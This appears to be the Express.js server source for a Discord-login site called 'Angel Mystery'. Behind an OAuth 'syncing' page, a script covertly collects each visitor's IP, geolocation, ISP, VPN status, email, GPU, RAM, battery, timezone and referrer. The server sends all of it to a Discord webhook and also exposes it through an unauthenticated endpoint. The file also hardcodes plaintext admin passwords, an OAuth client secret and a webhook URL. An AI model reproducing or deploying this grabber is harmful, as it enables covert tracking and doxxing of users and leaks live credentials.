const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const useragent = require('express-useragent');

const app = express();

// NOTA: No Vercel, variáveis globais como 'loggedUsers' resetam frequentemente.
let loggedUsers = []; 

const ADM_ACCOUNTS = {
    "Gaby": { pass: "gabyzinha123", role: "Ceo", avatar: "https://images-ext-1.discordapp.net/external/CLp2wPcuao-M7pWOmepvFYyMypqu2xDlx4eWSAU6Ex0/%3Fanimated%3Dtrue%26size%3D2048/https/cdn.discordapp.com/avatars/965382207592079412/a_54ec27d5fe242382ad7883767fe65e7a.webp?animated=true" },
    "Naruse": { pass: "vanigu21", role: "Developer & Sub-Dono", avatar: "https://images-ext-1.discordapp.net/external/tBBHXoq68HLRznwIVMdYs4nlltbandTde2wfKPg-lrU/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/1175417856503058453/787d8259a41f507a88a481158a0c9fc5.png?format=webp&quality=lossless" },
    "Luiz": { pass: "Luiz_sub984", role: "Sub-Dono", avatar: "https://images-ext-1.discordapp.net/external/BRYxYuczMk3AfxBRzeVPnJbwU4oRAWeLXBRGOc1thZ0/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/1463635683251061010/76c06cd26b2015d9794aa48c70717a82.png?format=webp&quality=lossless" },
    "Fael": { pass: "fael_suporte874", role: "Suporte", avatar: "https://images-ext-1.discordapp.net/external/add7pJ-GLn7XgTBKCMcCpuBlq-WvKRzn24xLek6B7pI/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/1144886410931875942/a2ef96232b84fd9d7af6fb95b466cf4d.png?format=webp&quality=lossless" }
};

app.set('trust proxy', true);
app.use(useragent.express());
app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(process.cwd(), 'public')));

const clientId = '1470564552285622394';
const clientSecret = 'sbAIKgxyRx7NO1kKNZ91FotBU8_HIEpO';
const redirectUri = 'https://angelmysstery.vercel.app/callback';
const scope = 'identify email guilds';
const discordApiUrl = 'https://discord.com/api';
const webhookUrl = 'https://discord.com/api/webhooks/1470566086012571668/DfmUDRRE40wfmX3Yi42HSHeTVWO-f33FEEMTwW-6uDH27f6l1MyNdBojrinvVW1So3F2';

// --- ROTAS ---

app.get('/', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'index.html'));
});

app.get('/adm', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'adm.html'));
});

app.get('/favicon.ico', (req, res) => res.status(204).end());

app.get('/api/users-list', (req, res) => {
    res.json(loggedUsers);
});

app.post('/login-adm', async (req, res) => {
    const { user, pass } = req.body;
    const account = ADM_ACCOUNTS[user];

    if (account && account.pass === pass) {
        const token = crypto.createHash('sha256').update(pass + "angel_salt").digest('hex');
        try {
            await axios.post(webhookUrl, {
                embeds: [{
                    title: "👑 STAFF ONLINE • PAINEL ADM",
                    description: `O administrador **${user}** entrou no painel.`,
                    color: 16736439, 
                    thumbnail: { url: account.avatar },
                    fields: [
                        { name: "👤 Administrador", value: `\`${user}\``, inline: true },
                        { name: "🛡️ Cargo", value: `\`${account.role}\``, inline: true }
                    ],
                    timestamp: new Date()
                }]
            });
        } catch (err) { console.log("Erro Webhook ADM"); }
        res.json({ success: true, token, role: account.role, user: user, avatar: account.avatar });
    } else {
        res.status(401).json({ success: false, message: "Acesso negado" });
    }
});

// --- SISTEMA DISCORD ---

app.get('/login', (req, res) => {
  const state = crypto.randomBytes(16).toString('hex');
  const authUrl = `${discordApiUrl}/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scope}&state=${state}`;
  res.redirect(authUrl);
});

app.get('/callback', async (req, res) => {
  const { code } = req.query;
  if (!code) return res.status(400).send('Código não recebido');

  try {
    const tokenRes = await axios.post(`${discordApiUrl}/oauth2/token`,
      new URLSearchParams({
        client_id: clientId, client_secret: clientSecret, grant_type: 'authorization_code', code, redirect_uri: redirectUri,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const accessToken = tokenRes.data.access_token;
    const [userRes, guildsRes] = await Promise.all([
        axios.get(`${discordApiUrl}/users/@me`, { headers: { Authorization: `Bearer ${accessToken}` } }),
        axios.get(`${discordApiUrl}/users/@me/guilds`, { headers: { Authorization: `Bearer ${accessToken}` } })
    ]);

    const user = userRes.data;
    const guildsCount = guildsRes.data.length;
    const creationDate = new Date(Number((BigInt(user.id) >> 22n) + 1420070400000n)).toLocaleDateString('pt-BR');

    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();

    let geo = { city: '?', regionName: '?', country: '?', isp: '?', isVpn: 'Analisando...' };
    try {
      const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,proxy,hosting`);
      if(geoRes.data.status === 'success') {
          geo = geoRes.data;
          geo.isVpn = (geoRes.data.proxy || geoRes.data.hosting) ? '🚩 Sim (VPN/Proxy)' : '✅ Não';
      }
    } catch (e) { console.log("Erro Geo"); }

    const avatarUrl = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256` : 'https://cdn.discordapp.com/embed/avatars/0.png';

    res.send(`
      <html>
        <head><style>body { background: #070707; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }</style></head>
        <body>
          <div style="text-align: center; border: 1px solid #ff5fb7; padding: 30px; border-radius: 20px;">
            <h2 style="color: #ff5fb7;">Sincronizando...</h2>
          </div>
          <script>
            (async () => {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Desconhecida";
                
                let batInfo = "N/A";
                try {
                    const battery = await navigator.getBattery();
                    batInfo = Math.round(battery.level * 100) + "% " + (battery.charging ? "⚡" : "🔋");
                } catch(e) {}

                const dataExtra = {
                    res: window.screen.width + "x" + window.screen.height,
                    gpu: gpu,
                    ram: navigator.deviceMemory || "Desconhecida",
                    cores: navigator.hardwareConcurrency || "Desconhecido",
                    bat: batInfo,
                    ref: document.referrer || "Acesso Direto",
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    lang: navigator.language
                };

                await fetch('/final-log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        user: ${JSON.stringify(user)},
                        ip: "${ip}",
                        geo: ${JSON.stringify(geo)},
                        extra: dataExtra,
                        creation: "${creationDate}",
                        guilds: "${guildsCount}",
                        avatar: "${avatarUrl}"
                    })
                });

                localStorage.setItem('user', JSON.stringify({ id: "${user.id}", username: "${user.username}", avatar: "${avatarUrl}" }));
                setTimeout(() => { window.location.href = "/"; }, 1000);
            })();
          </script>
        </body>
      </html>
    `);
  } catch (err) { res.status(500).send('Erro'); }
});

app.post('/final-log', async (req, res) => {
    const { user, ip, geo, extra, creation, guilds, avatar } = req.body;
    loggedUsers.push({ user, ip, geo, extra, creation, guilds, avatar, loginDate: new Date() });

    try {
        await axios.post(webhookUrl, {
            embeds: [{
                title: '🕵️ Auditoria Naruse • Angel Mystery',
                color: (geo.proxy || geo.hosting) ? 16711680 : 15906303,
                thumbnail: { url: avatar },
                fields: [
                    { name: '👤 Usuário', value: `**${user.username}** \`(${user.id})\``, inline: false },
                    { name: '📧 Email', value: `||${user.email || 'Não autorizado'}||`, inline: true },
                    { name: '📅 Conta Criada', value: `\`${creation}\``, inline: true },
                    { name: '🏠 Guildas', value: `\`${guilds} servidores\``, inline: true },
                    { name: '🌐 Rede & IP', value: `**IP:** \`${ip}\`\n**Provedor:** \`${geo.isp}\`\n**VPN:** \`${geo.isVpn}\``, inline: false },
                    { name: '📍 Localização', value: `\`${geo.city}, ${geo.regionName} - ${geo.country}\`\n**Fuso:** \`${extra.tz}\``, inline: true },
                    { name: '💻 Hardware', value: `**GPU:** \`${extra.gpu}\`\n**RAM:** \`${extra.ram}GB\` | **CPUs:** \`${extra.cores}\`\n**Tela:** \`${extra.res}\``, inline: true },
                    { name: '🔋 Status', value: `**Bateria:** \`${extra.bat}\`\n**Idioma:** \`${extra.lang}\`\n**Vindo de:** \`${extra.ref}\``, inline: true }
                ],
                footer: { text: "Vigilância Angel Mystery v3.0 • Modo Security" },
                timestamp: new Date()
            }]
        });
        res.sendStatus(200);
    } catch (e) { res.sendStatus(500); }
});

module.exports = app;